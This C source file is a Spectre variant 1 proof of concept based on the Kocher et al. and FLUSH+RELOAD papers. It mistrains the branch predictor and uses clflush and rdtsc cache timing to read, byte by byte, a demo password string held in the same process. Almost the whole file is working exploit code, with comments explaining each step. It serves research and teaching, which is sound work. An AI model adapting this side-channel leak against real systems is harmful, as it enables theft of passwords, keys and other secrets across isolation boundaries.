/*
    Based on:

    Kocher, Paul, et al. "Spectre attacks: Exploiting
    speculative execution." 2019 IEEE Symposium on
    Security and Privacy (SP). IEEE, 2019.
*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

/*
    On my machine with Intel(R) Core(TM) i7-9850H CPU @ 2.60GHz
    the access to cached element takes on average 26 CPU cycles
    and access to main memory takes about 170 CPU cycles so the
    threshold is set approximately in the middle.

    See: 01_flush.png, 01_noflush.png
*/
#define CACHE_HIT_THRESHOLD (100)

char sideChannelArray[256 * 4096];
char publicArraySize = 16;
char publicArray[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
char *secret = "Password: P@55w0|2d1337&*)(#@!~`";
char temp = 0;

void victim_function(size_t x) {
    // We try to cache sideChannelArray at index publicArray[x] * 4096
    // while the CPU is retrieving publicArraySize from
    // main memory.
    if (x < publicArraySize) {
        temp = sideChannelArray[publicArray[x] * 4096];
    }
}

int flushOnly(char *adrs)
{
    asm __volatile__ ("clflush (%0)"::"r"(adrs):);
}

/*
    Function flushReload taken from FLUSH+REALOAD paper:

    Yarom, Y., & Falkner, K. (2014). FLUSH+ RELOAD:
    a high resolution, low noise, L3 cache side-channel attack.
    In 23rd {USENIX} Security Symposium ({USENIX} Security 14) (pp. 719-732).
*/
int flushReload(char *adrs)
{
    volatile unsigned long time;

    asm __volatile__ (
        "mfence             \n"
        "lfence             \n"
        "rdtsc              \n"
        "lfence             \n"
        "movl %%eax, %%esi  \n"
        "movl (%1), %%eax   \n"
        "lfence             \n"
        "rdtsc              \n"
        "subl %%esi, %%eax  \n"
        "clflush 0(%1)      \n"
        : "=a" (time)
        : "c" (adrs)
        :  "%esi", "%edx");

    return time < CACHE_HIT_THRESHOLD;
}

/*
    Partly taken from Enrik August's GitHub:
    https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
*/
char readMemoryByte(size_t secretAddr) {
    int results[256] = { 0 };
    int tries, i, j, k, temp;
    size_t training_x, x;

    /*
        The value located at secretAddr address is indirectly
        read through cache as a side channel about 1000 times.
    */
    for (tries = 999; tries > 0; tries--)
    {
        for (i = 0; i < 256; i++)
            flushOnly(&sideChannelArray[i * 4096]);
        training_x = tries % publicArraySize;
        for (j = 29; j >= 0; j--)
        {
            flushOnly(&publicArraySize);
            for (temp = 100; temp >= 0; temp--) {} // delay
            /*
                Very important step:
                Plays with bits to prevent branch prediction algorithm,
                every 6th call to victim function inputs x as secretAddr.
            */
            x = ((j % 6)-1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (secretAddr ^ training_x));
            victim_function(x);
        }
        // Flush+Reload each element to extract cached secret value
        for (i = 0; i < 256; i++)
        {
            temp = ((i * 167) + 13) & 255; // IMPORTANT: used to prevent stride branch prediction
            if (flushReload(&sideChannelArray[temp*4096]))
                results[temp]++;
        }
    }

    /*
        CPUs with Spectre mitigations try to insert noise into cache,
        so we find which ASCII printable character was read through
        cache the most times.
    */
    for (k = 0; k < 256; k++)
    {
        // Find which value repeated the most times
        temp = 0;
        j = results[0];
        for (i = 1; i < 256; i++)
        {
            if (results[i] > j)
            {
                j = results[i];
                temp = i;
            }
        }

        // Return if the temp is ASCII printable character
        if (32 <= temp && temp <= 126)
            return temp;
        else
            results[temp] = 0; // Mark as checked
    }
    return 0;
}

int main(int argc, const char * * argv) {
    size_t secretAddr = (size_t)(secret - (char *)publicArray);
    int i;
    char value;

    /*
        IMPORTANT:
        Initialize sideChannelArray to avoid copy-on-write optimization
    */
    for (i = 0; i < sizeof(sideChannelArray); i++)
        sideChannelArray[i] = 1;

    printf("Extracting secret:\n", strlen(secret));
    for (i = 0; i < strlen(secret); i++)
    {
        value = readMemoryByte(secretAddr++);
        if (value == 0)
            printf("Couldn't read\n");
        else
            printf("%c\n", value);
    }
    return (0);
}
